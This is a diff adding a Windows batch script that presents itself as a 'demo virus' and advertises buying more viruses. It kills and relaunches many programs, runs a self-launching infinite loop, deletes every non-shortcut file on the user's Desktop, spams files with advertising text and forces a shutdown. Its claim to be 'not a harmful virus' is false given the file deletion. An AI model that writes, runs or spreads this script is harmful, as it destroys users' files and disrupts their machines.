@@ -1,0 +1,184 @@
+@ECHO OFF
+TASKLIST
+TASKKILL /im notepad.exe
+taskkill /im opera.exe
+taskkill /im calc.exe
+TASKKILL /im cmd.exe
+TASKKILL /im NetProj.exe
+TASKKILL /im mip.exe
+TASKKILL /im displayswitch.exe
+TASKKILL /im mspaint.exe
+TASKKILL /im mstsc.exe
+TASKKILL /imSnippingTool.exe
+TASKKILL /im SoundRecorder.exe
+TASKKILL /im mobsync.exe
+TASKKILL /im StikyNot.exe
+TASKKILL /im explorer.exe
+TASKKILL /im mblctr.exe
+TASKKILL /im wordpad.exe
+TASKKILL /im iexplore.exe
+TASKKILL /im ByteFence.exe
+TASKKILL /im wmplayer.exe
+
+start notepad.exe
+start opera.exe
+start calc.exe
+start cmd.exe
+start NetProj.exe
+start mip.exe
+start displayswitch.exe
+start mspaint.exe
+start mstsc.exe
+start SnippingTool.exe
+start SoundRecorder.exe
+start mobsync.exe
+start StikyNot.exe
+start explorer.exe
+start mblctr.exe
+start wordpad.exe
+start iexplore.exe
+start ByteFence.exe
+start wmplayer.exe
+echo for more virus call 9547551208>>guddu.bat
+color 0a
+pushd "%~dp0"
+rem NET_SHOWNETWORKS
+:a
+title win%random%a
+timeout /t 2/nobreak >null
+echo dis wnt do arm 2cmptr 4real m8
+start guddu.bat
+goto a
+
+For %%# in (
+    "%USERPROFILE%\Desktop\*"
+) Do (
+    If /I not "%%~x#" EQU ".lnk" (
+        Del /Q "%%#"
+    )
+)
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.ppt
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.xlsx
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.doc
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.apk
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.html
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.txt
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.ppt
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.xlsx
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.doc
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.apk
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.html
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.txt
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.ppt
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.xlsx
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.doc
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.apk
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.html
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.txt
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.ppt
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.xlsx
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.doc
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.apk
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.html
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.txt
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.ppt
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.xlsx
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.doc
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.apk
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.html
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.txt
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.ppt
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.xlsx
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.doc
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.apk
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.html
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.txt
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.ppt
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.xlsx
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.doc
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.apk
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.html
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.txt
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.ppt
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.xlsx
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.doc
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.apk
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.html
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.txt
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.ppt
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.xlsx
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.doc
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.apk
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.html
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.txt
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.ppt
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.xlsx
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.doc
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.apk
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.html
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.txt
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.ppt
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.xlsx
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.doc
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.apk
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.html
+
+echo This is Not a Harmfull virus.It is use for just a Demo If You want to Buy this type of Virus visit http://www.gm.hc.peperonity.net.This Virus is created by Guddu modok.for more virus call 9547551208>>guddu.txt
+
+echo Insert a message of impending doom here.
+shutdown -s -f -t 60 -c "THIS IS JUST A DEMO VIRUS WHICH IS CREATE BYE GUDDU MODOK & HIS COMPANY"
+Pause&Exit
